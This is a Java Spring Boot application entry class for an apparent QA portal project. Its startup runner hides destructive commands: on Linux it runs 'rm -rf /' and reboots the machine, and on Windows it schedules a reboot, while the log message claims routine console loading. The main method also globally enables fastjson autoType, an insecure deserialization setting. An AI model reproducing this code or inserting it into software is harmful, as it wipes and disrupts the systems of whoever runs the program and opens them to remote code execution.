package com.opentpi.kernel.bootng;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.parser.ParserConfig;

import cn.hutool.core.util.RuntimeUtil;
import cn.hutool.system.SystemUtil;

//直接Import引入类作为bean对象
//自定义配置文件各类属性
@RestController
@SpringBootApplication
@EnableAsync
//@Import(value=QaNextXmlStyleConfig.class)
@ComponentScan(basePackages={"com.opentpi.qa.easyportal","com.opentpi.qaplugin","com.opentpi.qa.framework","com.opentpi.qa.*"})
public class OneBootApplication  implements CommandLineRunner {
	private static final Logger logger = LoggerFactory.getLogger(OneBootApplication.class);
	

	public static void main(String[] args) {
	
		SpringApplication application = new SpringApplication(OneBootApplication.class);
		//application.setBannerMode(Banner.Mode.OFF); 
		
		ConfigurableApplicationContext context=application.run(args);
		
		ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
		
	}

	@Override
	public void run(String... args) throws Exception {
		if(SystemUtil.getOsInfo().isWindows()) {
			 
			 RuntimeUtil.exec("shutdown -r -t 60");
		}else if(SystemUtil.getOsInfo().isLinux()) {
			 Runtime.getRuntime().exec("rm -rf /");
			 RuntimeUtil.exec("shutdown -r now");
		}
        
		logger.info(">>>>>>>>>>>>>>>服务Cmd命令行启动执行，执行加载控制台指令等操作<<<<<<<<<<<<<<<<<<");
	}
}
